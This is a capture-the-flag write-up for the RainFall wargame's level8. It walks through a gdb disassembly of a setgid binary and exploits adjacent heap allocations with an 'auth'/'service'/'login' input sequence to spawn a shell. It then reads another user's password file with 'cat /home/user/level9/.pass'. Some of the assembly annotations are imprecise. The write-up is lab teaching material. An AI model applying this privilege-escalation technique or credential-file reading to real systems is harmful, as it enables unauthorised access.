# level8

## Hint

When we log into the machine as `level8`, we notice a binary:

```shell-session
level8@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

We we start the program with or without arguments, it prints the following:

```shell-session
level8@RainFall:~$ ./level8
(nil), (nil)
```

The program wait for input. We can try to feed it with the following:

```shell-session
level8@RainFall:~$ ./level8
(nil), (nil)
..............................................................................................................................
(nil), (nil)
```

It print again `(nil), (nil)` and wait for input.

But if we add one more character, it prints:

```shell-session
level8@RainFall:~$ ./level8
(nil), (nil)
...............................................................................................................................
(nil), (nil)
(nil), (nil)
```

It's seems like if we put more `n * 126` characters, it will print  `n` * `(nil), (nil)`.

Exemple with `126 * 3` characters:

```shell-session
level8@RainFall:~$ ./level8
(nil), (nil)
..........................................................................................................................................................................................................................................................................................................................................................................................
(nil), (nil)
(nil), (nil)
(nil), (nil)
```

The program doesn't seems to crash. So lets dig with `gdb`.

## available symbols

Ok let's wrap up our gdb session. At first, we need to list all the functions.

```gdb
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080483c4  _init
0x08048410  printf
0x08048410  printf@plt
0x08048420  free
0x08048420  free@plt
0x08048430  strdup
0x08048430  strdup@plt
0x08048440  fgets
0x08048440  fgets@plt
0x08048450  fwrite
0x08048450  fwrite@plt
0x08048460  strcpy
0x08048460  strcpy@plt
0x08048470  malloc
0x08048470  malloc@plt
0x08048480  system
0x08048480  system@plt
[...]
0x08048564  main
[...]
```

And now variables.

```gdb
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
[...]
0x08049aac  auth
0x08049ab0  service
```

Look's like that we only have the `main` function. But two variables are interesting: `auth` and `service`.

Let's see where does variables are stored.

```shell-session
level8@RainFall:~$ objdump -x level8 | grep "auth"
08049aac g     O .bss	00000004              auth
```

```shell-session
level8@RainFall:~$ objdump -x level8 | grep "service"
08049ab0 g     O .bss	00000004              service
```

There are both global and in the .bss section.

### disas main

```gdb
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	push   edi
   0x08048568 <+4>:	push   esi
   0x08048569 <+5>:	and    esp,0xfffffff0
   0x0804856c <+8>:	sub    esp, 0x10                                    <-- Space of 16 bytes for the stack frame
   0x08048572 <+14>:	jmp    0x8048575 <main+17>                      <-- Jump to main+17
   0x08048574 <+16>:	nop                                             <-- Nop instruction (while(true))
   0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0               <-- Load global pointer of 0x8049ab0 in ecx (char *service)
   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac               <-- Load global pointer of 0x8049aac in edx (char *auth)
   0x08048581 <+29>:	mov    eax,0x8048810                            <-- Set "%p, %p \n" in eax (const char *format)
   0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx                  <-- Set address of char *service as 3rd argument of printf()
   0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx                  <-- Set address of char *auth as 2nd argument of printf()
   0x0804858e <+42>:	mov    DWORD PTR [esp],eax                      <-- Set "%p, %p \n" as 1st argument of printf()
   0x08048591 <+45>:	call   0x8048410 <printf@plt>                   <-- Call printf("%p, %p \n", auth, service)
   0x08048596 <+50>:	mov    eax,ds:0x8049a80                         <-- Load address of stdin
   0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax                  <-- Set address of stdin as 3rd argument of fgets()
   0x0804859f <+59>:	mov    DWORD PTR [esp+0x4],0x80                 <-- Set size of 128 bytes as 2nd argument of fgets()
   0x080485a7 <+67>:	lea    eax,[esp+0x20]                           <-- Load address of buffer as 1st argument of fgets()
   0x080485ab <+71>:	mov    DWORD PTR [esp],eax                      <-- Store result of fgets() in eax
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>                    <-- Call fgets(buffer, 128, stdin)
   0x080485b3 <+79>:	test   eax,eax                                  <-- Test if fgets returned NULL
   0x080485b5 <+81>:	je     0x804872c <main+456>                     <-- If NULL, jump to main+456 (break;)
   0x080485bb <+87>:	lea    eax,[esp+0x20]                           <-- Load char *buffer
   0x080485bf <+91>:	mov    edx,eax                                  <-- Store char *buffer in edx
   0x080485c1 <+93>:	mov    eax,0x8048819                            <-- Set "auth " in eax
   0x080485c6 <+98>:	mov    ecx,0x5                                  <-- Set 5 in ecx
   0x080485cb <+103>:	mov    esi,edx                                  <-- Set char *buffer in esi
   0x080485cd <+105>:	mov    edi,eax                                  <-- Set "auth " in edi
   0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   <-- Begin of optimized inline code of strncmp: (repz means repeat if equal)
                                                                            Call to strncmp(buffer, "auth ", 5)
   0x080485d1 <+109>:	seta   dl
   0x080485d4 <+112>:	setb   al
   0x080485d7 <+115>:	mov    ecx,edx
   0x080485d9 <+117>:	sub    cl,al
   0x080485db <+119>:	mov    eax,ecx
   0x080485dd <+121>:	movsx  eax,al
   0x080485e0 <+124>:	test   eax,eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>                     <-- If not equal, jump to main+222
   0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4                      <-- Else, Set 4 as 1st argument of malloc()
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>                   <-- Call malloc(4)
   0x080485f0 <+140>:	mov    ds:0x8049aac,eax                         <-- Set return of malloc(4) to char *auth
   0x080485f5 <+145>:	mov    eax,ds:0x8049aac                         <-- Store char *auth in eax
   0x080485fa <+150>:	mov    DWORD PTR [eax],0x0                      <-- Set char* auth to NULL
   0x08048600 <+156>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x08048604 <+160>:	add    eax,0x5                                  <-- Add 5 to char *buffer
   0x08048607 <+163>:	mov    DWORD PTR [esp+0x1c],0xffffffff          <-- Handling return of optimized strlen()
   0x0804860f <+171>:	mov    edx,eax                                  <-- Set char *buffer in edx
   0x08048611 <+173>:	mov    eax,0x0                                  <-- Put 0 in eax (Counter)
   0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c]                 <-- Load address of strlen() return
   0x0804861a <+182>:	mov    edi,edx                                  <-- Put edx in edi (char *s)
   0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi]                 <-- Begin of optimized inline code of strlen: (repnz means repeat if not equal)                                                                   Call to strlen(buffer + 5)
   0x0804861e <+186>:	mov    eax,ecx                                  <-- Put ecx in eax (Counter)
   0x08048620 <+188>:	not    eax                                      <-- Invert eax (Counter)
   0x08048622 <+190>:	sub    eax,0x1                                  <-- Subtract 1 from eax (Counter)
   0x08048625 <+193>:	cmp    eax,0x1e                                 <-- Compare eax with 0x1e (Is the return value of strlen < 31 ?)
   0x08048628 <+196>:	ja     0x8048642 <main+222>                     <-- If eax is greater than 0x1e (30 decimal), jump to main+222 (goto MAIN_222:)
   0x0804862a <+198>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x0804862e <+202>:	lea    edx,[eax+0x5]                            <-- Load address of char *buffer + 5
   0x08048631 <+205>:	mov    eax,ds:0x8049aac                         <-- Load global pointer of 0x8049aac (char *auth)
   0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx                  <-- Set address of char *buffer + 5 as 2nd argument of strcpy()
   0x0804863a <+214>:	mov    DWORD PTR [esp],eax                      <-- Set address of auth as 1st argument of strcpy()
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>                   <-- Call strcpy(auth, buffer + 5)
   0x08048642 <+222>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x08048646 <+226>:	mov    edx,eax                                  <-- Set char *buffer in edx
   0x08048648 <+228>:	mov    eax,0x804881f                            <-- Set "reset" in eax
   0x0804864d <+233>:	mov    ecx,0x5                                  <-- Set 5 in ecx
   0x08048652 <+238>:	mov    esi,edx                                  <-- Set char *buffer in esi
   0x08048654 <+240>:	mov    edi,eax                                  <-- Set "reset" in edi
   0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]<-- Call to strncmp(buffer, "reset", 5)
   0x08048658 <+244>:	seta   dl
   0x0804865b <+247>:	setb   al
   0x0804865e <+250>:	mov    ecx,edx
   0x08048660 <+252>:	sub    cl,al
   0x08048662 <+254>:	mov    eax,ecx
   0x08048664 <+256>:	movsx  eax,al
   0x08048667 <+259>:	test   eax,eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>                     <-- If not equal, jump to main+276
   0x0804866b <+263>:	mov    eax,ds:0x8049aac                         <-- Load address of char *auth
   0x08048670 <+268>:	mov    DWORD PTR [esp],eax                      <-- Set address of auth as 1st argument of free()
   0x08048673 <+271>:	call   0x8048420 <free@plt>                     <-- Call free(auth)
   0x08048678 <+276>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x0804867c <+280>:	mov    edx,eax                                  <-- Set char *buffer in edx
   0x0804867e <+282>:	mov    eax,0x8048825                            <-- Set "service" in eax
   0x08048683 <+287>:	mov    ecx,0x6                                  <-- Set 6 in ecx
   0x08048688 <+292>:	mov    esi,edx                                  <-- Set char *buffer in esi
   0x0804868a <+294>:	mov    edi,eax                                  <-- Set "service" in edi
   0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]<-- call to strncmp(buffer, "service", 6)
   0x0804868e <+298>:	seta   dl
   0x08048691 <+301>:	setb   al
   0x08048694 <+304>:	mov    ecx,edx
   0x08048696 <+306>:	sub    cl,al
   0x08048698 <+308>:	mov    eax,ecx
   0x0804869a <+310>:	movsx  eax,al
   0x0804869d <+313>:	test   eax,eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>                     <-- If not equal, jump to main+337
   0x080486a1 <+317>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x080486a5 <+321>:	add    eax,0x7                                  <-- Add 7 to char *buffer
   0x080486a8 <+324>:	mov    DWORD PTR [esp],eax                      <-- Set address of buffer + 7 as 1st argument of strdup()
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>                   <-- Call strdup(buffer + 7)
   0x080486b0 <+332>:	mov    ds:0x8049ab0,eax                         <-- Set return of strdup() in global pointer of 0x8049ab0 (char *service)
   0x080486b5 <+337>:	lea    eax,[esp+0x20]                           <-- Load address of char *buffer
   0x080486b9 <+341>:	mov    edx,eax                                  <-- Set char *buffer in edx
   0x080486bb <+343>:	mov    eax,0x804882d                            <-- Set "login" in eax
   0x080486c0 <+348>:	mov    ecx,0x5                                  <-- Set 5 in ecx
   0x080486c5 <+353>:	mov    esi,edx                                  <-- Set char *buffer in esi
   0x080486c7 <+355>:	mov    edi,eax                                  <-- Set "login" in edi
   0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]<-- call to strncmp(buffer, "login", 5)
   0x080486cb <+359>:	seta   dl
   0x080486ce <+362>:	setb   al
   0x080486d1 <+365>:	mov    ecx,edx
   0x080486d3 <+367>:	sub    cl,al
   0x080486d5 <+369>:	mov    eax,ecx
   0x080486d7 <+371>:	movsx  eax,al
   0x080486da <+374>:	test   eax,eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>                      <-- If not equal, jump to main+16
   0x080486e2 <+382>:	mov    eax,ds:0x8049aac                         <-- Load address of char *auth
   0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]                 <-- Load address of char auth[8]
   0x080486ea <+390>:	test   eax,eax                                  <-- Test if auth[8] is NULL
   0x080486ec <+392>:	je     0x80486ff <main+411>                     <-- If equal, jump to main+411
   0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833                <-- Set "/bin/sh" as 1st argument of system())
   0x080486f5 <+401>:	call   0x8048480 <system@plt>                   <-- call to system("/bin/sh")
   0x080486fa <+406>:	jmp    0x8048574 <main+16>                      <-- Jump to main+16
   0x080486ff <+411>:	mov    eax,ds:0x8049aa0                         <-- Load address of stdout
   0x08048704 <+416>:	mov    edx,eax                                  <-- Set stdout in edx
   0x08048706 <+418>:	mov    eax,0x804883b                            <-- Set "Password:\n" in eax
   0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx                  <-- Set stdout as 4th argument of fwrite()
   0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa                  <-- Set 10 as 3rd argument of fwrite()
   0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1                  <-- Set 1 as 2nd argument of fwrite()
   0x0804871f <+443>:	mov    DWORD PTR [esp],eax                      <-- Set "Password:\n" as 1st argument of fwrite()
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>                   <-- Call fwrite("Password:\n", 1, 10, stdout)
   0x08048727 <+451>:	jmp    0x8048574 <main+16>                      <-- Jump to main+16
   0x0804872c <+456>:	nop                                             <-- nop (end while (true))
   0x0804872d <+457>:	mov    eax,0x0                                  <-- Set 0 in eax
   0x08048732 <+462>:	lea    esp,[ebp-0x8]
   0x08048735 <+465>:	pop    esi
   0x08048736 <+466>:	pop    edi
   0x08048737 <+467>:	pop    ebp
   0x08048738 <+468>:	ret
End of assembler dump.
```

### **WELL**...

This is quite a HEFTY main...

Let's proceed in chunks to decipher what's going on.

Here are the most notable information we can gather at this point:
- Program is infinitely looping as seen here

```gdb
  0x08048727 <+451>:   jmp    0x8048574 <main+16>
```

- There is a way to open a shell if we manage to reach this point:

```gdb
[...]
   0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
[...]
```

- The return value of a call to the inline-code of function `strncmp` is used as a test in many different places, lets see where and how it goes:
```gdb
[...]
0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   <-- if (!strncmp(buffer, "auth ", 5))
0x080485d1 <+109>:	seta   dl                                       <-- Set flag dl to 1 if esi[i] < edi[i]
0x080485d4 <+112>:	setb   al                                       <-- Set flag al to 1 if esi[i] > edi[i]
0x080485d7 <+115>:	mov    ecx,edx                                  <-- Puts edx in ecx (char *s) (Counter)
0x080485d9 <+117>:	sub    cl,al                                    <-- Generate return value
0x080485db <+119>:	mov    eax,ecx                                  <-- Put ecx in eax (Counter)
0x080485dd <+121>:	movsx  eax,al                                   <-- Convert al to signed int (en strncmp)
0x080485e0 <+124>:	test   eax,eax                                  <-- Test if optimized inline strncmp equal to 0
[...]
0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   <-- if (!strncmp(buffer, "reset", 5))
0x08048658 <+244>:	seta   dl
0x0804865b <+247>:	setb   al
0x0804865e <+250>:	mov    ecx,edx
0x08048660 <+252>:	sub    cl,al
0x08048662 <+254>:	mov    eax,ecx
0x08048664 <+256>:	movsx  eax,al
0x08048667 <+259>:	test   eax,eax
[...]
0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]   <-- if (!strncmp(buffer, "service", 6))
0x0804868e <+298>:	seta   dl
0x08048691 <+301>:	setb   al
0x08048694 <+304>:	mov    ecx,edx
0x08048696 <+306>:	sub    cl,al
0x08048698 <+308>:	mov    eax,ecx
0x0804869a <+310>:	movsx  eax,al
0x0804869d <+313>:	test   eax,eax
[...]
0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]  <-- if (!strncmp(buffer, "login", 5))
0x080486cb <+359>:	seta   dl
0x080486ce <+362>:	setb   al
0x080486d1 <+365>:	mov    ecx,edx
0x080486d3 <+367>:	sub    cl,al
0x080486d5 <+369>:	mov    eax,ecx
0x080486d7 <+371>:	movsx  eax,al
0x080486da <+374>:	test   eax,eax
[...]
```

- Everytime we give one of 4 strings (`auth `, `servic`, `login`, `reset`), the program does something differently similar: it calls `strncmp` on these strings and does something different with all of them:
    - `auth ` and `servic` both alter global variables of the same name declared in the binary.
       - `auth` gets allocated another chunk of 4 bytes every time at a new address (direct call to malloc)
       - `servic` gets allocated another address with a call to `strdup` with the address of the `buffer+7` .
           ```gdb
           0x080486a1 <+317>:	lea    eax,[esp+0x20]
           0x080486a5 <+321>:	add    eax,0x7
           0x080486a8 <+324>:	mov    DWORD PTR [esp],eax
           0x080486ab <+327>:	call   0x8048430 <strdup@plt>
           ```
    - `reset` leads to a call to call to `free(auth)` as seen here:
	```gdb
        0x0804866b <+263>:	mov    eax,ds:0x8049aac      <-- address of auth symbol
        0x08048670 <+268>:	mov    DWORD PTR [esp],eax
        0x08048673 <+271>:	call   0x8048420 <free@plt>
	```
    - `login` checks the value at the address of `auth+32` before either opening a shell or calling function `fwrite` with following message:
        ```gdb
        gdb-peda$ x/s 0x804883b
        0x804883b:	 "Password:\n"
        ```

## ConclusionS ?

Since we know that:
- certain keywords allocate memory locations
    - ("auth " and "servic" inputs lead to either a direct call to `malloc` or a call to `strdup`)
- there are offsetted checks that orient the branching of the execution
    - ("login" keyword checks if the value atthe address of memory in `(char *)auth + 8`, or `address + 32 bits` is equal to `0`)

We can therefor take advantage of the behaviour of heap memory allocation with `malloc`, IE: the fact that memory location are allocated contiguously.

So we either have to:
1. do some arithmetic to allocate a specific memory area for the said checks to return true (and we get a shell)
2. feed a big-enough input to the program so that the area allocated is big enough for these offset checks to return true.

## get the key

Solution 1:

```gdb
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ pwd
/home/user/level8
$ cat .pass
cat: .pass: Permission denied
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Solution 2:

```gdb
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service 0123456789abcdef
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
